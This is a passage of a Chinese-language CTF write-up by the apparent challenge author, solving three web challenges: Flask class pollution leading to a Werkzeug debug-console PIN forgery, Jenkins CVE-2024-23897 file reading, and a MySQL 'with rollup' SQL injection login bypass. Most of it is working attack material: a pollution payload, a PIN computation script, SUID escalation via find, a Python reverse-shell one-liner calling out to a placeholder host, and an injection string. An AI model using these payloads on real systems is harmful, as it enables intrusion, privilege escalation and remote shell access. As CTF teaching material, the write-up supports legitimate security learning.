<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;__init__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;__globals__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;__file__&quot;</span><span class="punctuation">:</span><span class="string">&quot;/flag&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>POST发送请求之后, 再次查看<code>/</code>路由, 发现debug页面提示报错<code>Permission denied: &#39;/flag&#39;</code><br>这里是因为我把<code>/flag</code>设置为了root用户权限, 但是flask是momo用户在运行, 读取<code>/etc/passwd</code>是可以猜到的</p>
<p>结合之前提到的pin码, 我们试着读取一下计算pin码所需要的文件</p>
<p>在刚才的报错界面中可以找到python版本为3.8, 高版本用sha1的计算脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sha1</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;momo&#x27;</span>  <span class="comment"># /etc/passwd</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,  <span class="comment"># 默认值</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,  <span class="comment"># 默认值</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span>  <span class="comment"># 报错得到</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;156525269814096&#x27;</span>,  <span class="comment"># /sys/class/net/eth0/address 冒分16进制转10进制, 我习惯去掉冒号在devtools里面0x...直接得到</span></span><br><span class="line">    <span class="comment"># machine_id 一般 = /etc/machine-id+/proc/self/cgroup的斜杠后半段, 真机三个一起用：</span></span><br><span class="line">    <span class="comment"># 1./etc/machine-id = ea1fc30b6f4a173cea015d229c6b55b6</span></span><br><span class="line">    <span class="comment"># 2./proc/sys/kernel/random/boot_id = e1fca593-dd38-4d12-bb7e-d6bf6cde6cbb (用不到)</span></span><br><span class="line">    <span class="comment"># 3./proc/self/cgroup = cri-containerd-5500ffd3801380b91976ea5b9e0ac8b7f208ab72a99bab34af7a8fb0c99e7791.scope</span></span><br><span class="line">    <span class="comment"># 这里因为是k3s后端, 所以/proc/self/cgroup不是常见的类型, 但是格式同docker </span></span><br><span class="line">    <span class="string">&#x27;ea1fc30b6f4a173cea015d229c6b55b6cri-containerd-5500ffd3801380b91976ea5b9e0ac8b7f208ab72a99bab34af7a8fb0c99e7791.scope&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我的计算结果<code>193-344-993</code>, 在报错界面找到终端窗口或者直接访问<code>/console</code>路由, 输入pin码可以进入python终端<br><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2024-04/202404131302957.png" alt="image.png"></p>
<p>然后就是这个道理了, 后面我习惯反弹shell回来, 或者你直接用下面这句也行, 这里考的就是suid提权了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">os.popen(<span class="string">&#x27;/usr/bin/find /flag -exec bash -p -c &quot;cat /flag&quot; \;&#x27;</span>).read()</span><br></pre></td></tr></table></figure>

<p>或者反弹一个shell会更简单</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">&quot;xx.xx.xx.xx&quot;</span>,<span class="number">7210</span>));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>);os.dup2(s.fileno(),<span class="number">2</span>);<span class="keyword">import</span> pty; pty.spawn(<span class="string">&quot;sh&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>当前用户是momo , 也是需要suid提权, 除了上面那句还可以用这句</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find /flag -<span class="built_in">exec</span> /bin/sh -p \; -quit</span><br></pre></td></tr></table></figure>
<p>拿下了~</p>
<h2 id="jenkinslove"><a href="#jenkinslove" class="headerlink" title="jenkinslove"></a>jenkinslove</h2><p>简单的一道cve, 没啥太难的, 就是设置了一个小坑, flag并没有放在&#x2F;flag中, 所以需要读一下别的东西, 参考p牛的文章</p>
<blockquote>
<p><a href="https://www.leavesongs.com/PENETRATION/jenkins-cve-2024-23897.html">Jenkins文件读取漏洞拾遗（CVE-2024-23897） | 离别歌</a></p>
</blockquote>
<p>里面提到了两种读取文件的方法, 第一种只能读取一行, 我在&#x2F;flag中的第一行写的是<br><code>nanamo_flag is not here,but ...</code></p>
<p>如果有心的话看到下面有个匿名用户可读全部文件内容的方法, 试试这个可以得到&#x2F;flag内容是<br><code>nanamo_flag is not here,but ...  </code>maybe environ?&#96;</p>
<p>提示读取环境变量, 这里读取有时候需要用&#x2F;&#x2F;作为i第一个&#x2F;, 注意一下就行<br>做过web的大概知道这个environ指代的是什么, 没做过的, 搜一下也很容易得到<br><code>/proc/$PID/environ</code><br>如果你用的是<code>/proc/self/environ</code>, 那是读不出来的, 因为这个容器的入口是我设置的<code>docker-entrypoint.sh</code>, flag也是在这里面进行了加载, 所以flag藏在了<br><code>/proc/1/environ</code>中</p>
<p>其实有的ctf也会出这样的非预期解, 干脆就拿过来用了</p>
<h2 id="汇总"><a href="#汇总" class="headerlink" title="汇总"></a>汇总</h2><p>这个题目后来添加了提示, 但是没做过的师傅应该还是比较雾水的<br>实际这道题是一个with rollup注入, 借鉴了<br><a href="https://guokeya.github.io/post/KQHBR3liu/"> Mysql with rollup注入(ISCC-2018 线下赛Web 私地一) </a></p>
<p><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2024-04/202404131529950.png" alt="image.png"></p>
<p>界面很朴素, 下面给了提示, 尝试和提示给了admin和root用户, 输入这两个用户的话是密码错误</p>
<p><code>Executed Operations</code>中发现, 只查询了用户名, 这是比较奇怪的, 而且密码很有可能是拿<br>来和输入的密码作比较, 进行鉴权</p>
<p>如果尝试了一句话密码, 则会爆出<code>results are more than one</code>, 所以猜测需要得到一个查询结果的密码和我们输入的密码相同才可以</p>
<p>于是<code>with roll up</code>, 黑名单基本可以无视, 空格用<code>/**/</code>url编码后绕过即可<br>查询结果会变成一个null, 由于后台弱比较, 我们不输入密码就可以拿到flag了</p>
<p>这道主要还是靠经验了, 原理的话推荐自己用数据库做一下实验, 可以看我上面链接的文章和自己补充网络知识</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username<span class="operator">=</span>admin<span class="string">&#x27;/**/group/**/by/**/password/**/with/**/rollup/**/limit/**/1/**/offset/**/1#&amp;password=</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>Java</tag>
        <tag>Safety</tag>
        <tag>CTF</tag>
        <tag>Cve</tag>
        <tag>Python</tag>
        <tag>php</tag>
      </tags>
  </entry>
</search>
